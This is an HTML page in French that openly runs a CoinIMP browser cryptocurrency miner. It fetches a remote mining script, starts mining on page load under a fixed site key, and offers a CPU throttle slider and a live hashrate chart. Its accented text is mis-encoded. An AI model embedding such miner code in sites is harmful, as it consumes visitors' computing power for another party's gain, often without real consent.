<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>CoinIMP Miner</title>
  <style>
    body {
      background:#0d0d0d;
      color:#eee;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 30px;
    }
    .slider-container {
      margin-top: 30px;
    }
    input[type=range] {
      width: 300px;
    }
    .value {
      font-weight: bold;
      color: #4caf50;
    }
    canvas {
      margin-top: 20px;
      background: #1a1a1a;
      border: 1px solid #333;
      border-radius: 10px;
    }
    #currentHps {
      font-size: 24px;
      margin-top: 20px;
      color: #4caf50;
    }
  </style>
</head>
<body>
  <h1>ðŸ’» CoinIMP JavaScript Miner</h1>
  <p>DÃ©placez la barre pour ajuster le <strong>Throttle</strong> (puissance CPU utilisÃ©e par le minage).</p>
  
  <div class="slider-container">
    <label for="throttleRange">Throttle: <span id="throttleValue">0.3</span></label><br>
    <input type="range" id="throttleRange" min="0" max="1" step="0.01" value="0.3">
  </div>

  <h2>ðŸ“Š Hashrate en temps rÃ©el</h2>
  <div id="currentHps">0.00 H/s</div>
  <canvas id="hashrateChart" width="600" height="300"></canvas>

  <!-- Script Chart.js -->
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

  <!-- Script CoinIMP -->
  <script src="https://www.hostingcloud.racing/RFry.js"></script>
  <script>
    // DÃ©marrage du mineur
    var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
      throttle: 0.3, 
      c: 'w'
    });
    _client.start();
    _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 20, "#3d3d3d");

    // Slider throttle
    const throttleSlider = document.getElementById("throttleRange");
    const throttleValue = document.getElementById("throttleValue");

    throttleSlider.addEventListener("input", function() {
      const val = parseFloat(this.value);
      throttleValue.textContent = val.toFixed(2);
      _client.setThrottle(val); // applique la nouvelle valeur
    });

    // =========================
    //  GRAPHE H/s EN TEMPS REEL
    // =========================
    const ctx = document.getElementById('hashrateChart').getContext('2d');
    const hashrateChart = new Chart(ctx, {
      type: 'line',
      data: {
        labels: [],
        datasets: [{
          label: 'Hashes/s',
          data: [],
          borderColor: '#4caf50',
          backgroundColor: 'rgba(76, 175, 80, 0.2)',
          fill: true,
          tension: 0.3
        }]
      },
      options: {
        responsive: false,
        animation: false,
        scales: {
          x: {
            title: { display: true, text: 'Temps (s)' },
            ticks: { color: '#aaa' }
          },
          y: {
            beginAtZero: true,
            title: { display: true, text: 'H/s' },
            ticks: { color: '#aaa' }
          }
        },
        plugins: {
          legend: { labels: { color: '#eee' } }
        }
      }
    });

    // Compteur H/s en direct
    const currentHpsDisplay = document.getElementById("currentHps");
    let time = 0;

    setInterval(() => {
      if (_client.isRunning()) {
        const hps = _client.getHashesPerSecond();
        
        // Mettre Ã  jour le compteur
        currentHpsDisplay.textContent = hps.toFixed(2) + " H/s";

        // Ajouter au graphe
        hashrateChart.data.labels.push(time + "s");
        hashrateChart.data.datasets[0].data.push(hps);

        // Garde seulement les 20 derniers points
        if (hashrateChart.data.labels.length > 20) {
          hashrateChart.data.labels.shift();
          hashrateChart.data.datasets[0].data.shift();
        }

        hashrateChart.update();
        time++;
      }
    }, 1000); // mise Ã  jour chaque seconde
  </script>
</body>
</html>
